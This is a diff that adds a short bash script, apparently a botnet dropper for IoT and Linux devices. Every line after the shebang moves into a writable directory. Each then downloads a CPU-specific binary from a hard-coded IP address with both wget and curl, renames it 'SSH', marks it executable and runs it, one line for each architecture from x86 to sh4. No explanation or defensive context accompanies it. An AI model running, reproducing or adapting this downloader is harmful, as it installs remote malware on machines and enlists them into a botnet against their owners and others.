@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.x86; curl -O http://87.121.98.42/bins/hoho.x86;cat hoho.x86 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.mips; curl -O http://87.121.98.42/bins/hoho.mips;cat hoho.mips >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.mpsl; curl -O http://87.121.98.42/bins/hoho.mpsl;cat hoho.mpsl >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.arm; curl -O http://87.121.98.42/bins/hoho.arm;cat hoho.arm >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.arm5; curl -O http://87.121.98.42/bins/hoho.arm5;cat hoho.arm5 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.arm6; curl -O http://87.121.98.42/bins/hoho.arm6;cat hoho.arm6 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.arm7; curl -O http://87.121.98.42/bins/hoho.arm7;cat hoho.arm7 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.ppc; curl -O http://87.121.98.42/bins/hoho.ppc;cat hoho.ppc >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.m68k; curl -O http://87.121.98.42/bins/hoho.m68k;cat hoho.m68k >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/bins/hoho.sh4; curl -O http://87.121.98.42/bins/hoho.sh4;cat hoho.sh4 >SSH;chmod +x *;./SSH
